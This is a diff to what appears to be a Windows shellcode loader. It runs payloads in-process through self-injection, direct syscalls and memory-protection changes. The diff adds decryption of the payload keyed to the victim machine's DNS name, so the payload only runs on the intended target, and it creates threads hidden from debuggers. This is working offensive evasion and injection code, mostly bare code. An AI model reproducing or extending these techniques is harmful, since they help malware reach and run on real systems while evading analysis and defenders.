@@ -68,7 +68,9 @@ void my_init_syscalls_list(void) {
     #endif
 }
 
-void executor(void (*shellcode)(void)) {
+typedef void* (*funcPtr)();
+
+void executor(funcPtr shellcode) {
     (*shellcode)();
 }
 
@@ -89,7 +91,9 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
             return NULL;
         }
     #else
+	puts("before sleep \n");
         Sleep(sleep_time);
+	puts("after sleep \n");
     #endif
 
     #ifdef FLUCTUATE
@@ -97,13 +101,13 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
     #endif
 
     #if defined(SELFINJECT) && defined(RX) && defined(_TEXT_)
-        typedef void* (*funcPtr)();
         funcPtr func = (funcPtr)shellcode;
         *phThread = 0;
         #ifdef _DEBUG_
             puts("self executing the payload in .text");
         #endif
-        return executor(func);
+        executor(func);
+	return NULL;
     #else
         void* allocation = nullptr;
         #ifdef SYSCALLS
@@ -186,6 +190,24 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
             wprintf(L"Written %d bytes of data @ 0x%x\n", bytesWritten, allocation);
         #endif
 
+        #ifdef XOR_KEY
+            unsigned long max_length = 256;
+            char domain[256] = { 0 };
+            if (!GetComputerNameExA(ComputerNameDnsFullyQualified, domain, &max_length)) {
+                #ifdef _DEBUG_
+                wprintf(L"ERROR: GetComputerNameExA = 0x%x\n", GetLastError());
+                #endif
+            } else {
+                #ifdef _DEBUG_
+                wprintf(L"GetComputerNameExA = %s\n", domain);
+                #endif
+            }
+
+            for (SIZE_T i = 0; i < size; i++) {
+                ((char*)allocation)[i] ^= domain[i % max_length];
+            }
+        #endif
+
         #ifdef RX
             DWORD old = 0;
             #ifdef SYSCALLS
@@ -234,7 +256,7 @@ LPVOID inject_shellcode_self(unsigned char shellcode[], SIZE_T size, PHANDLE phT
                 THREAD_ALL_ACCESS,
                 nullptr,
                 (HANDLE)-1,
-                executor,
+                (void*)executor,
                 allocation,
                 THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                 0,
